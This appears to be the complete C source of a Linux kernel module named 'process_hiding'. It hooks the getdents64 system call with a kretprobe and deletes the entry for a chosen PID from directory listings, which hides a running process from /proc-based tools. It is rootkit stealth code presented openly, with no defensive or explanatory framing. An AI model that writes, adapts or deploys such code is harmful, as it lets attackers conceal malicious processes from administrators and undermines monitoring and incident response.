#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/moduleparam.h>
#include <asm/ptrace.h>

static char target_pid[16] = "0";
module_param_string(target_pid, target_pid, sizeof(target_pid), 0644);
MODULE_PARM_DESC(target_pid, "PID to hide from directory listings");

// Saved at function entry, used at return
struct dirent_data {
    struct linux_dirent64 __user *dirent;
};

// Runs WHEN getdents64 is called — save the dirent arg before regs get clobbered
static int entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct dirent_data *data = (struct dirent_data *)ri->data;
    struct pt_regs *real_regs = task_pt_regs(current);
    data->dirent = (struct linux_dirent64 __user *) real_regs->si;
    return 0;
}

// Runs WHEN getdents64 returns — modify the output buffer
static int ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct dirent_data *data = (struct dirent_data *)ri->data;
    struct linux_dirent64 __user *dirent = data->dirent;
    struct linux_dirent64 *kdirent, *current_dir, *previous_dir = NULL;
    long ret = regs_return_value(regs);
    unsigned long offset = 0;

    if (ret <= 0)
        return 0;

    printk(KERN_INFO "process_hiding: ret_handler fired ret=%ld dirent=%px\n", ret, dirent);

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return 0;

    if (copy_from_user(kdirent, dirent, ret)) {
        printk(KERN_WARNING "process_hiding: copy_from_user failed\n");
        kfree(kdirent);
        return 0;
    }

    while (offset < ret) {
        current_dir = (void *)kdirent + offset;

        printk(KERN_INFO "process_hiding: checking '%s' vs '%s'\n",
               current_dir->d_name, target_pid);

        if (strcmp(current_dir->d_name, target_pid) == 0) {
            printk(KERN_INFO "process_hiding: MATCH — removing entry\n");
            if (current_dir == kdirent) {
                ret -= current_dir->d_reclen;
                memmove(current_dir,
                        (void *)current_dir + current_dir->d_reclen,
                        ret);
                continue;
            } else {
                previous_dir->d_reclen += current_dir->d_reclen;
            }
        } else {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    if (copy_to_user(dirent, kdirent, ret))
        printk(KERN_WARNING "process_hiding: copy_to_user failed\n");

    kfree(kdirent);
    regs->ax = ret;
    return 0;
}

static struct kretprobe krp = {
    .handler     = ret_handler,
    .entry_handler = entry_handler,
    .data_size   = sizeof(struct dirent_data),
    .maxactive   = 20,
    .kp.symbol_name = "__x64_sys_getdents64",
};

static int __init hide_init(void)
{
    int ret = register_kretprobe(&krp);
    if (ret < 0) {
        printk(KERN_ERR "process_hiding: register_kretprobe failed %d\n", ret);
        return ret;
    }
    printk(KERN_INFO "process_hiding: installed, hiding PID %s\n", target_pid);
    return 0;
}

static void __exit hide_exit(void)
{
    unregister_kretprobe(&krp);
    printk(KERN_INFO "process_hiding: removed\n");
}

module_init(hide_init);
module_exit(hide_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Hides a target PID using kretprobe on getdents64");